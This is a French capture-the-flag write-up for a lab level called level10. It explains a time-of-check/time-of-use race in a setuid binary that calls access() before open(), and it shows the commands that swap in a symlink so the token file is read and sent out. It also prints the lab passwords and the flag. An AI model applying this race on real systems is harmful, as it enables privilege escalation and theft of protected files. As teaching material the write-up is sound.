# Level10

Se connecter en tant que level10:

    $ ssh 192.168.1.124 -p 4242 -l level10
    level10@192.168.1.124's password: s5cAJpM8ev6XHw998pRWG728z

---

Premiere étape de recherche

    $ ls -la
    -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
    -rw-------  1 flag10  flag10     26 Mar  5  2016 token

> Comme pour le level 8 et 9 nous avons toujours 2 fichiers, un binaire portant le nom du level et un fichier token.
> Mais pour le level 8 et 10, n'avons pas les droits pour lire le fichier token, mais le binaire possède un stickybit qui lui donne les droit de son owner flag10, qui est le même que l'owner du token.

    $ ./level10
    ./level10 file host
    sends file to host if you have access to it

> Le programme envoi un fichier vers une adresse à première vue

    $ ./level10 token localhost
    You don't have access to token

    $ ./level10 .profile localhost
    Connecting to localhost:6969 .. Unable to connect to host localhost

> Pas de problèmes de droits avec un fichier appartenant à level10

Donc le programme essaye de se connecter à une adresse IP passée en argument sur le port 6969 et d'écrire le fichier passé en argument sur le serveur.

On va devoir chercher un peu plus avec GDB

    $ gdb level10
    $ (gdb) disas main
    ...
    0x08048749 <+117>:	call   0x80485e0 <access@plt>
    ...
    0x0804889b <+455>:	call   0x80485a0 <open@plt>
    ...

> On voit un appel à access très tôt (surement pour checker les droits du fichier à ouvrir) et le open est fait bien plus loin, après l'ouverture de la socket

Avant de se connecter, la fonction access est appellée afin de vérifier les droits de l'utilisateur réel (donc qui exécute le binaire). L'utilisateur réel level10 n'as pas les droits sur le fichier token.

Mais l'utilisation d'access puis open crée un trou de sécurité comme l'explique le man de [access](http://manpagesfr.free.fr/man/man2/access.2.html), car entre le temps de la vérification et de l'ouverture nous pouvons crée un lien symbolique d'un fichier ou quel nous n'avons pas les droits réel.

Ainsi, il est possible de donner en paramètre à lexécutable un fichier sur lequel nous avons tous les droits, afin que la fonction access retourne une réponse positive.

Ensuite, en passant l'adresse IP de la machine 192.168.1.124, l'executable level10 attend une réponse ce qui nous laisse le temps de créer un lien symbolique sur le fichier passé en paramètre vers le fichier token.
pour faire ce scenario on créer un script python pour lance le serveur est cree le lien sumbolique quand on recoit un connection.

    $ python /tmp/nc.py&

    $ rm -f /tmp/ex; touch /tmp/ex; ./level10 /tmp/ex <machine-ip>

    $ su flag10
    Password:
    Don't forget to launch getflag !
    $ getflag
    Check flag.Here is your token : feulo4b72j7edeahuete3no7c
